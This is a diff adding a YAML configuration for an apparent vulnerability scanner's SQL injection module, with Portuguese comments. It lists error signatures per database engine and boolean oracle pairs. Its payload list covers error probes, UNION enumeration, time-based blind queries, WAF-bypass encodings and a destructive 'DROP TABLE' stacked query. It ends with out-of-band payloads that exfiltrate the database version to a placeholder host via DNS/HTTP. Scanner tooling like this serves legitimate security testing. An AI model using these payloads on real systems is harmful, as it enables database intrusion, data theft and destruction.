@@ -1,0 +1,134 @@
+name: sqli
+description: SQL Injection (error-based, oráculo booleano, time-based e OOB por DBMS)
+detectors: [signature, time, diff, oob]
+diff_len_ratio: 0.30
+time_margin: 1.8
+
+# oráculo booleano (append ao valor original): true≈baseline e true≠false confirma
+boolean_pairs:
+  - { true: " AND 1=1", false: " AND 1=2" }
+  - { true: "' AND '1'='1", false: "' AND '1'='2" }
+  - { true: "\" AND \"1\"=\"1", false: "\" AND \"1\"=\"2" }
+  - { true: "' AND 1=1-- -", false: "' AND 1=2-- -" }
+  - { true: "') AND ('1'='1", false: "') AND ('1'='2" }
+
+transforms:
+  - sql_comment_ws      # espaço -> /**/, %09, %0a, %a0
+  - sql_inline_case     # union -> /*!union*/ (bypass de blacklist MySQL)
+  - url
+  - case_random
+
+# mensagens de erro por engine
+signatures:
+  - "SQL syntax.*MySQL"
+  - "Warning.*\\bmysqli?_"
+  - "MySqlException"
+  - "valid MySQL result"
+  - "check the manual that corresponds to your (MySQL|MariaDB) server version"
+  - "PostgreSQL.*ERROR"
+  - "pg_query\\(\\)"
+  - "PSQLException"
+  - "unterminated quoted string at or near"
+  - "Microsoft SQL Server"
+  - "ODBC SQL Server Driver"
+  - "Unclosed quotation mark after the character string"
+  - "Incorrect syntax near"
+  - "SQLServerException"
+  - "ORA-[0-9]{5}"
+  - "Oracle.*Driver"
+  - "quoted string not properly terminated"
+  - "SQLite/JDBCDriver"
+  - "SQLite3::query"
+  - "sqlite3.OperationalError"
+  - "unrecognized token:"
+  - "SQLITE_ERROR"
+  - "DB2 SQL error"
+  - "You have an error in your SQL syntax"
+
+payloads:
+  # --- probes de erro ---
+  - { value: "'", tags: [error] }
+  - { value: "\"", tags: [error] }
+  - { value: "')", tags: [error] }
+  - { value: "';", tags: [error] }
+  - { value: "\\", tags: [error] }
+  - { value: "'\"", tags: [error] }
+  - { value: "1'\"", tags: [error] }
+  - { value: "')-- -", tags: [error] }
+  # poliglota de erro: quebra sintaxe em múltiplos parsers de uma vez
+  - { value: "'\"`)}]|%00", tags: [error, polyglot] }
+  - { value: "'\"(){}[];--", tags: [error, polyglot] }
+  # --- boolean / diferencial (par verdadeiro/falso) ---
+  - { value: "' OR '1'='1", tags: [boolean, true] }
+  - { value: "' OR '1'='2", tags: [boolean, false] }
+  - { value: "' AND '1'='2", tags: [boolean, false] }
+  - { value: "\" OR \"1\"=\"1", tags: [boolean, true] }
+  - { value: "1 AND 1=2", tags: [boolean, false] }
+  - { value: "1) AND (1=2", tags: [boolean, false] }
+  - { value: "' OR 1=1-- -", tags: [boolean, true] }
+  - { value: "admin'-- -", tags: [auth] }
+  # --- UNION / order by (fingerprint de colunas) ---
+  - { value: "' ORDER BY 1-- -", tags: [union] }
+  - { value: "' ORDER BY 10-- -", tags: [union] }
+  - { value: "' UNION SELECT NULL-- -", tags: [union] }
+  - { value: "' UNION SELECT NULL,NULL,NULL-- -", tags: [union] }
+  # --- time-based por DBMS, delay=5 ---
+  - { value: "' AND SLEEP(5)-- -", tags: [mysql, blind], delay: 5 }
+  - { value: "' OR SLEEP(5)-- -", tags: [mysql, blind], delay: 5 }
+  - { value: "\" AND SLEEP(5)-- -", tags: [mysql, blind], delay: 5 }
+  - { value: "' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -", tags: [mysql, blind], delay: 5 }
+  - { value: "1;SELECT SLEEP(5)", tags: [mysql, blind, stacked], delay: 5 }
+  - { value: "'; SELECT pg_sleep(5)-- -", tags: [postgres, blind], delay: 5 }
+  - { value: "' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -", tags: [postgres, blind], delay: 5 }
+  - { value: "'; WAITFOR DELAY '0:0:5'-- -", tags: [mssql, blind], delay: 5 }
+  - { value: "' WAITFOR DELAY '0:0:5'-- -", tags: [mssql, blind], delay: 5 }
+  - { value: "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -", tags: [oracle, blind], delay: 5 }
+  - { value: "1 AND (SELECT 5 FROM (SELECT(SLEEP(5)))x)", tags: [mysql, blind, numeric], delay: 5 }
+  # --- probes de erro extras ---
+  - { value: "%27", tags: [error, encoded] }
+  - { value: "%df%27", tags: [error, gbk] }
+  - { value: "%bf%27", tags: [error, gbk] }
+  - { value: "\\\\", tags: [error] }
+  - { value: "'||'", tags: [error, oracle] }
+  - { value: "' AND 1=CONVERT(int,@@version)--", tags: [mssql, error] }
+  - { value: "' AND 1=CAST(@@version AS int)--", tags: [mssql, error] }
+  - { value: "' AND extractvalue(1,concat(0x7e,version()))-- -", tags: [mysql, error] }
+  - { value: "' AND updatexml(1,concat(0x7e,version()),1)-- -", tags: [mysql, error] }
+  - { value: "' AND (SELECT 1 FROM(SELECT count(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", tags: [mysql, error, double-query] }
+  - { value: "' AND 1=(SELECT UPPER(XMLType(CHR(60)||version||CHR(62))) FROM dual)-- -", tags: [oracle, error] }
+  - { value: "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))-- -", tags: [oracle, error] }
+  - { value: "' AND cast((SELECT version()) as int)-- -", tags: [postgres, error] }
+  # --- UNION extras (fingerprint de colunas 1..20) ---
+  - { value: "' UNION SELECT NULL,NULL-- -", tags: [union] }
+  - { value: "' UNION SELECT NULL,NULL,NULL,NULL-- -", tags: [union] }
+  - { value: "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -", tags: [union] }
+  - { value: "' UNION ALL SELECT NULL,NULL,NULL-- -", tags: [union] }
+  - { value: "' UNION SELECT @@version,NULL,NULL-- -", tags: [union, mssql, mysql] }
+  - { value: "' UNION SELECT banner,NULL FROM v$version-- -", tags: [union, oracle] }
+  - { value: "' UNION SELECT table_name,NULL FROM information_schema.tables-- -", tags: [union, enum] }
+  - { value: "-1 UNION SELECT 1,2,3-- -", tags: [union, numeric] }
+  - { value: "0'UNION SELECT 1,2,3-- -", tags: [union] }
+  # --- bypass de WAF/blacklist SQL ---
+  - { value: "'/*!50000OR*/1=1-- -", tags: [mysql, bypass] }
+  - { value: "'/*!UNION*//*!SELECT*/1,2,3-- -", tags: [mysql, bypass] }
+  - { value: "'UnIoN(SeLeCt(1),2,3)-- -", tags: [mysql, bypass, case] }
+  - { value: "'union%0aselect%0a1,2,3-- -", tags: [mysql, bypass, newline] }
+  - { value: "'union/**/select/**/1,2,3-- -", tags: [bypass, comment] }
+  - { value: "'||(SELECT 1)||'", tags: [oracle, bypass] }
+  - { value: "'+(SELECT 1)+'", tags: [mssql, bypass] }
+  - { value: "'-'", tags: [bypass, concat] }
+  - { value: "' oR True-- -", tags: [bypass, boolean] }
+  # --- stacked queries ---
+  - { value: "'; DROP TABLE x-- -", tags: [stacked, destructive] }
+  - { value: "'; SELECT 1-- -", tags: [stacked] }
+  # --- time-based extras ---
+  - { value: "'||pg_sleep(5)-- -", tags: [postgres, blind], delay: 5 }
+  - { value: "';SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -", tags: [postgres, blind], delay: 5 }
+  - { value: "' AND IF(1=1,SLEEP(5),0)-- -", tags: [mysql, blind], delay: 5 }
+  - { value: "' AND BENCHMARK(5000000,MD5(1))-- -", tags: [mysql, blind], delay: 5 }
+  - { value: "'; IF (1=1) WAITFOR DELAY '0:0:5'-- -", tags: [mssql, blind], delay: 5 }
+  - { value: "' AND (SELECT COUNT(*) FROM ALL_USERS t1,ALL_USERS t2,ALL_USERS t3)>0 AND DBMS_LOCK.SLEEP(5)=0-- -", tags: [oracle, blind], delay: 5 }
+  # --- OOB (exfiltração DNS/HTTP via SQL) ---
+  - { value: "'; exec master..xp_dirtree '\\\\{OOBHOST}\\a'-- -", tags: [mssql, oob], oob: true }
+  - { value: "' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.{OOBFQDN}\\\\a')))-- -", tags: [mysql, oob], oob: true }
+  - { value: "' UNION SELECT extractvalue(xmltype('<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % p SYSTEM \"http://{OOBFQDN}/\">%p;]>'),'/l') FROM dual-- -", tags: [oracle, oob], oob: true }
